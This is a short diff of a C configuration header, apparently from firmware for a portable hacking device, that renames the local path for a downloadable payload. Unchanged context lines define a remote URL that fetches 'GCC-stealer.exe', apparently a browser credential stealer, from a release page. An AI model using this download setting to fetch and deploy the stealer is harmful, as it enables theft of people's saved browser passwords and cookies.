@@ -59,8 +59,8 @@
   #define TXT_WF_SCN "WiFi Scan"
   
   #define PYLD_DWNLD "Payload\nDownload"
-  #define PYLD_PATH "/win-chrome/GCC-stealer.exe"
-  #define PYLD_DIR "/win-chrome"
+  #define PYLD_PATH "/win-chrm/GCC-stealer.exe"
+  #define PYLD_DIR "/win-chrm"
   #define PYLD_RMT_PATH "https://github.com/illera88/GCC-stealer/releases/download/v0.1.1/GCC-stealer.exe"
   #define ROOT_CA_CRT \
 "-----BEGIN CERTIFICATE-----\n" \
